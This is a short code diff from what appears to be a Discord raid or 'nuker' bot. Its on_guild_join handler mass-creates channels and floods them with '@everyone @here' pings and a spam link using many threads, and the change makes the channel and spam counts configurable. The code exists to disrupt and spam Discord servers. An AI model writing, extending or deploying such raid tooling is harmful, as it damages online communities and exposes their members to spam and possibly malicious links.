@@ -70,7 +70,7 @@ async def on_guild_join(guild):
 			asyncio.run_coroutine_threadsafe(guild.create_text_channel(f"{ChannelName} {random.randint(1, 1000)}"), bot.loop)
 
 	threads = []
-	for _ in range(20):
+	for _ in range(ChannelsAmount):
 		thread = threading.Thread(target=create_channels)
 		thread.start()
 		threads.append(thread)
@@ -102,7 +102,7 @@ async def on_guild_join(guild):
 				asyncio.run_coroutine_threadsafe(channel.send(f"||@everyone @here|| {SpamLink}", embed=em), bot.loop)
 
 	threads = []
-	for _ in range(5):
+	for _ in range(SpamAmount):
 		thread = threading.Thread(target=send_messages)
 		thread.start()
 		threads.append(thread)
